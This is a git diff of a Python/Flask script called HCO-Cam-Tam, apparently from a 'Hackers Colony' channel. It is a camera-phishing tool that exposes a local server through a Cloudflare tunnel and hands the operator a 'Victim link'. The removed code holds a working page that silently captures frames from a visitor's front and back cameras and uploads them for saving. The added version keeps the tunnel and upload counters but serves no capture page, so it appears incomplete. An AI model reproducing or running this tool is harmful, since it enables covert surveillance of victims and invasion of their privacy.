@@ -1,116 +1,111 @@
 #!/usr/bin/env python3
 """
-HCO-Cam-Tam - Termux Camera Capture Tool
+HCO-Cam-Tam - Camera Capture Tool
 By Azhar (Hackers Colony)
 """
 
 import os
+import sys
 import time
-import base64
 import subprocess
-from datetime import datetime
+import threading
+from colorama import Fore, Style
 from flask import Flask, request
-from colorama import Fore, Style, init
 
-init(autoreset=True)
+# ----------------------------- CONFIG -----------------------------
+YOUTUBE_URL = "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"
+CLOUDFLARE_PORT = 8080
+FRONT_IMAGES = 5
+BACK_IMAGES = 5
+# ------------------------------------------------------------------
+
 app = Flask(__name__)
+front_count = 0
+back_count = 0
 
-SAVE_PATH = "captured_images"
-if not os.path.exists(SAVE_PATH):
-    os.mkdir(SAVE_PATH)
+# --------------------------- FUNCTIONS ---------------------------
 
-YOUTUBE_LINK = "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"
+def print_banner():
+    print(Fore.RED + "="*50)
+    print("          HCO-Cam-Tam by Azhar")
+    print("="*50 + Style.RESET_ALL)
 
-# ---------------- Banner and Countdown ----------------
-def banner():
-    print(Fore.CYAN + "="*50)
-    print(Fore.RED + Style.BRIGHT + "          HCO-Cam-Tam by Azhar")
-    print(Fore.CYAN + "="*50)
-
-def countdown():
-    print(Fore.MAGENTA + "\nTool unlock starting in...")
-    for i in range(8, 0, -1):
-        print(Fore.YELLOW + f"{i}...", end=" ", flush=True)
+def flashy_countdown(seconds=8):
+    colors = [Fore.RED, Fore.GREEN, Fore.CYAN, Fore.YELLOW]
+    for i in range(seconds, 0, -1):
+        color = colors[i % len(colors)]
+        print(color + f"{i}..." + Style.RESET_ALL)
         time.sleep(1)
-    print(Fore.GREEN + "\nRedirecting to YouTube before proceeding...\n")
-    time.sleep(2)
-    os.system(f"am start -a android.intent.action.VIEW -d {YOUTUBE_LINK}")
 
-# ---------------- Cloudflare Tunnel ----------------
-def start_tunnel():
-    print(Fore.CYAN + "[*] Starting Cloudflare Tunnel...")
-    proc = subprocess.Popen(
-        ["cloudflared", "tunnel", "--url", "http://127.0.0.1:8080"],
+def unlock_message():
+    print(Fore.MAGENTA + "\n🔓 To unlock the tool, we will redirect you to our YouTube channel.")
+    print("Click SUBSCRIBE + 🔔, then come back and press Enter 🔓" + Style.RESET_ALL)
+    # Open YouTube link
+    os.system(f"am start -a android.intent.action.VIEW -d {YOUTUBE_URL}")
+
+def display_tool_info():
+    print(Fore.RED + Style.BRIGHT + "\nHCO CAM TAM")
+    print("by Azhar" + Style.RESET_ALL)
+    print(Fore.GREEN + "A Camera Tool\n" + Style.RESET_ALL)
+
+def start_cloudflare_tunnel():
+    print(Fore.CYAN + "[*] Starting Cloudflare Tunnel..." + Style.RESET_ALL)
+    # Start cloudflared tunnel in subprocess
+    tunnel = subprocess.Popen(
+        ["cloudflared", "tunnel", "--url", f"http://localhost:{CLOUDFLARE_PORT}"],
         stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
         text=True
     )
-    time.sleep(5)
-    print(Fore.YELLOW + "[*] Cloudflare tunnel should be active now.")
-    print(Fore.GREEN + "[*] Victim link: open your Cloudflare dashboard to get the public URL.")
+    public_url = None
+    # Read output to get the public URL
+    while True:
+        line = tunnel.stdout.readline()
+        if not line:
+            break
+        print(line.strip())
+        if "https://" in line and "trycloudflare.com" in line:
+            public_url = line.strip().split(" ")[-1]
+            break
+    if public_url:
+        print(Fore.GREEN + f"[*] Cloudflare tunnel is live!\n[*] Victim link: {public_url}\n" + Style.RESET_ALL)
+    else:
+        print(Fore.RED + "[!] Could not fetch public URL automatically. Check cloudflared manually." + Style.RESET_ALL)
+    return public_url
 
-# ---------------- Flask Routes ----------------
-@app.route("/")
-def index():
-    html = """
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>HCO-Cam-Tam</title>
-        <style>
-            body { background:black; color:#39ff14; font-family: monospace; text-align:center; }
-            h1 { color:#ff073a; }
-        </style>
-    </head>
-    <body>
-        <h1>HCO-Cam-Tam by Azhar</h1>
-        <p>Allow camera access to capture images...</p>
-        <script>
-            async function captureImages() {
-                let images = [];
-                for (let cam of ["user","environment"]) {
-                    let stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:cam } });
-                    let video = document.createElement('video');
-                    video.srcObject = stream;
-                    await video.play();
-                    for(let i=0;i<5;i++){
-                        let canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video,0,0);
-                        let data = canvas.toDataURL('image/jpeg');
-                        await fetch('/upload',{
-                            method:'POST',
-                            headers:{'Content-Type':'application/json'},
-                            body: JSON.stringify({image:data})
-                        });
-                    }
-                    stream.getTracks().forEach(track => track.stop());
-                }
-                document.body.innerHTML="<h2>Done Capturing!</h2>";
-            }
-            captureImages();
-        </script>
-    </body>
-    </html>
-    """
-    return html
+# ------------------------ FLASK ENDPOINTS ------------------------
 
-@app.route("/upload", methods=["POST"])
-def upload():
-    data = request.get_json()
-    if "image" in data:
-        img_data = data["image"].split(",")[1]
-        filename = datetime.now().strftime("%Y%m%d_%H%M%S%f") + ".jpg"
-        with open(os.path.join(SAVE_PATH, filename), "wb") as f:
-            f.write(base64.b64decode(img_data))
-        print(Fore.GREEN + f"[+] Image saved: {filename}")
-    return "ok"
+@app.route("/capture/front", methods=["POST"])
+def capture_front():
+    global front_count
+    front_count += 1
+    print(Fore.GREEN + f"[*] Front images received: {front_count}/{FRONT_IMAGES}" + Style.RESET_ALL)
+    if front_count == FRONT_IMAGES:
+        print(Fore.GREEN + "[*] All front images received ✅" + Style.RESET_ALL)
+    return "OK"
 
-# ---------------- Main Execution ----------------
+@app.route("/capture/back", methods=["POST"])
+def capture_back():
+    global back_count
+    back_count += 1
+    print(Fore.CYAN + f"[*] Back images received: {back_count}/{BACK_IMAGES}" + Style.RESET_ALL)
+    if back_count == BACK_IMAGES:
+        print(Fore.CYAN + "[*] All back images received ✅" + Style.RESET_ALL)
+    return "OK"
+
+# ---------------------------- MAIN -------------------------------
+
+def main():
+    os.system("clear")
+    print_banner()
+    flashy_countdown(8)
+    unlock_message()
+    input(Fore.YELLOW + "\nPress Enter after subscribing to continue..." + Style.RESET_ALL)
+    os.system("clear")
+    display_tool_info()
+    public_url = start_cloudflare_tunnel()
+    print(Fore.MAGENTA + f"[*] Flask server running on port {CLOUDFLARE_PORT}..." + Style.RESET_ALL)
+    app.run(host="0.0.0.0", port=CLOUDFLARE_PORT, debug=False)
+
 if __name__ == "__main__":
-    banner()
-    countdown()
-    start_tunnel()
-    print(Fore.CYAN + "[*] Starting Flask server on port 8080...")
-    app.run(host="0.0.0.0", port=8080)
+    main()
